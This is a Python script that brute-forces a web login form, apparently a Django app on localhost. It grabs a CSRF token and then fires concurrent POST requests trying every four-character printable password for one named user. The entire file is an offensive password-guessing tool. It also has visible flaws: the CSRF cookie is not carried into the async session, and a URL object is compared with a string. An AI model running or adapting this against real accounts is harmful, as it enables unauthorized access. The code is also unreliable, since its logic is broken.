import asyncio
import aiohttp
from bs4 import BeautifulSoup
import requests

def extract_csrf_token(html_content):
    soup = BeautifulSoup(html_content, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
    return csrf_token

async def brute_force_password(session, payload):
    async with session.post("http://127.0.0.1:8000/accounts/login/", data=payload) as response:
        if response.status == 200 and response.url == 'http://127.0.0.1:8000/accounts/profile/':
            print(f"Password {payload['password']} is correct")
            return True
        else:
            print(f"Password {payload['password']} is incorrect")
            return False

async def brute_force_login(username, printable, num_tasks=100):
    async with aiohttp.ClientSession() as session:
        tasks = []
        for i1 in printable:
            for i2 in printable:
                for i3 in printable:
                    for i4 in printable:
                        password = i1 + i2 + i3 + i4
                        payload = {"username": username, "password": password, "csrfmiddlewaretoken": csrf_token}
                        tasks.append(brute_force_password(session, payload))
                        if len(tasks) >= num_tasks:
                            await asyncio.gather(*tasks)
                            tasks = []
        if tasks:
            await asyncio.gather(*tasks)

printable = r"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!'#$%&'()*+,-./:;<=>?@[\]^_`{|}~" + r'"'

login_page = requests.get("http://127.0.0.1:8000/accounts/login/")
csrf_token = extract_csrf_token(login_page.content)

asyncio.run(brute_force_login("Heyman", printable))
